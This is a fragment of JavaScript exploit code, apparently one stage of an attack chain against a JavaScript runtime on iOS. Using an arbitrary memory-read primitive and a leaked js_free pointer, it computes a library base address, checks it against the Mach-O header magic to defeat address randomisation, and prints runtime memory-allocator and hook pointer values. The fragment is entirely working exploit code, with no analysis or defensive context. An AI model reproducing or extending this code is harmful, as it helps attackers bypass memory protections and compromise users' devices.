/* ===== iOS 27 rt audit: hook slots + malloc state ===== */
  var MK = setres;
  function u64(x) { return BigInt.asUintN(64, x); }
  function rd32_(A) {
    var a = A & ~7n;
    var q = u64(RD(a));
    var sh = Number(A & 7n) * 8;
    return Number((q >> BigInt(sh)) & 0xffffffffn);
  }
  var base = 0n;
  if (CFG.JS_DEF_FREE) {
    base = u64(js_free - BigInt(CFG.JS_DEF_FREE));
    if ((rd32_(base) >>> 0) !== 0xfeedfacf) base = 0n;
  }
  if (base === 0n) { MK('A_NO_BASE'); return; }
  MK('A F=' + hex(js_free) + ' M=' + hex(RD(rt + 8n)) +
     ' 18=' + hex(RD(rt + 24n)) + ' 20=' + hex(RD(rt + 32n)) +
     ' 28=' + hex(RD(rt + 40n)) + ' 30=' + hex(RD(rt + 48n)) +
     ' 38=' + hex(RD(rt + 56n)) + ' 40=' + hex(RD(rt + 64n)));
